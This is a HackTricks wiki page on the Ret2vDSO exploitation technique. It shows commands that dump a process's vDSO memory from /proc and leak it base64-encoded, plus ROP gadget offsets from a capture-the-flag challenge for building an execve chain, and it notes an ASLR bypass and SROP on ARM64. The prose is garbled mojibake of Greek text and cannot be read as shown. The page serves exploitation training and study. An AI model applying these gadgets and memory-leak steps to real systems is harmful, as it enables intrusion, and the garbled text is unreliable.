# Ret2vDSO

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ **gadgets ÏƒÏ„Î·Î½ Ï€ÎµÏÎ¹Î¿Ï‡Î® vDSO**, Î· Î¿Ï€Î¿Î¯Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ Î±Ï€ÏŒ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï‡ÏÎ®ÏƒÏ„Î· ÏƒÏ„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï€Ï…ÏÎ®Î½Î±. Î£Îµ Î±Ï…Ï„Î¿ÏÏ‚ Ï„Î¿Ï…Ï‚ Ï„ÏÏ€Î¿Ï…Ï‚ Ï€ÏÎ¿ÎºÎ»Î®ÏƒÎµÏ‰Î½, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï€Î±ÏÎ­Ï‡ÎµÏ„Î±Î¹ Î¼Î¹Î± ÎµÎ¹ÎºÏŒÎ½Î± Ï€Ï…ÏÎ®Î½Î± Î³Î¹Î± Î½Î± Î³Î¯Î½ÎµÎ¹ dump Ï„Î·Ï‚ Ï€ÎµÏÎ¹Î¿Ï‡Î®Ï‚ vDSO.

Î‘ÎºÎ¿Î»Î¿Ï…Î¸ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒ [https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/) ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î¿ÏÎ¼Îµ Ï€ÏÏ‚ Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î³Î¯Î½ÎµÎ¹ dump Ï„Î·Ï‚ ÎµÎ½ÏŒÏ„Î·Ï„Î±Ï‚ vdso ÎºÎ±Î¹ Î½Î± Î¼ÎµÏ„Î±Ï†ÎµÏÎ¸ÎµÎ¯ ÏƒÏ„Î¿Î½ host Î¼Îµ:
```bash
# Find addresses
cat /proc/76/maps
08048000-08049000 r--p 00000000 00:02 317                                /target
08049000-0804a000 r-xp 00001000 00:02 317                                /target
0804a000-0804b000 rw-p 00002000 00:02 317                                /target
f7ff8000-f7ffc000 r--p 00000000 00:00 0                                  [vvar]
f7ffc000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

# Dump it
dd if=/proc/76/mem of=vdso bs=1 skip=$((0xf7ffc000)) count=$((0x2000))
8192+0 records in
8192+0 records out
8192 bytes (8.0KB) copied, 0.901154 seconds, 8.9KB/s

# Compress and leak it
gzip vdso
base64 vdso.gz

# Decompress and check of gadgets
echo '<base64-payload>' | base64 -d | gzip -d - > vdso
file vdso
ROPgadget --binary vdso | grep 'int 0x80'
```
ROP gadgets Ï€Î¿Ï… Î²ÏÎ­Î¸Î·ÎºÎ±Î½:
```python
vdso_addr = 0xf7ffc000

int_0x80_xor_eax_eax_ret_addr = 0x8049010
bin_sh_addr = 0x804a800

# 0x0000057a : pop edx ; pop ecx ; ret
pop_edx_pop_ecx_ret_addr = vdso_addr + 0x57a

# 0x00000cca : mov dword ptr [edx], ecx ; add esp, 0x34 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
mov_dword_ptr_edx_ecx_ret_addr = vdso_addr + 0xcca

# 0x00000ccb : or al, byte ptr [ebx + 0x5e5b34c4] ; pop edi ; pop ebp ; ret
or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr = vdso_addr + 0xccb

# 0x0000015cd : pop ebx ; pop esi ; pop ebp ; ret
pop_ebx_pop_esi_pop_ebp_ret = vdso_addr + 0x15cd
```
{% hint style="danger" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ Î»Î¿Î¹Ï€ÏŒÎ½ Ï€ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± **Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸ÎµÎ¯ Ï„Î¿ ASLR ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Ï„Î¿ vdso** Î±Î½ Î¿ Ï€Ï…ÏÎ®Î½Î±Ï‚ Î­Ï‡ÎµÎ¹ Î¼ÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¹ÏƒÏ„ÎµÎ¯ Î¼Îµ Ï„Î¿ CONFIG\_COMPAT\_VDSO, ÎºÎ±Î¸ÏÏ‚ Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· vdso Î´ÎµÎ½ Î¸Î± ÎµÎ¯Î½Î±Î¹ Ï„Ï…Ï‡Î±Î¯Î±: [https://vigilance.fr/vulnerability/Linux-kernel-bypassing-ASLR-via-VDSO-11639](https://vigilance.fr/vulnerability/Linux-kernel-bypassing-ASLR-via-VDSO-11639)
{% endhint %}

### ARM64

ÎœÎµÏ„Î¬ Ï„Î·Î½ ÎµÎ¾Î±Î³Ï‰Î³Î® ÎºÎ±Î¹ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï„Î·Ï‚ ÎµÎ½ÏŒÏ„Î·Ï„Î±Ï‚ vdso ÎµÎ½ÏŒÏ‚ Î´Ï…Î±Î´Î¹ÎºÎ¿Ï Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÏƒÎµ kali 2023.2 arm64, Î´ÎµÎ½ Î¼Ï€ÏŒÏÎµÏƒÎ± Î½Î± Î²ÏÏ‰ ÎµÎºÎµÎ¯ ÎºÎ±Î½Î­Î½Î± ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ gadget (ÎºÎ±Î½Î­Î½Î±Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î½Î± ÎµÎ»Î­Î³Î¾Ï‰ Ï„Î¿Ï…Ï‚ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î­Ï‚ Î±Ï€ÏŒ Ï„Î¹Î¼Î­Ï‚ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± Î® Î½Î± ÎµÎ»Î­Î³Î¾Ï‰ Ï„Î¿ x30 Î³Î¹Î± Î¼Î¹Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®) **ÎµÎºÏ„ÏŒÏ‚ Î±Ï€ÏŒ Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î½Î± ÎºÎ±Î»Î­ÏƒÏ‰ Î­Î½Î± SROP**. Î”ÎµÎ¯Ï„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒ Ï„Î· ÏƒÎµÎ»Î¯Î´Î±:

{% content-ref url="srop-sigreturn-oriented-programming/srop-arm64.md" %}
[srop-arm64.md](srop-sigreturn-oriented-programming/srop-arm64.md)
{% endcontent-ref %}

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
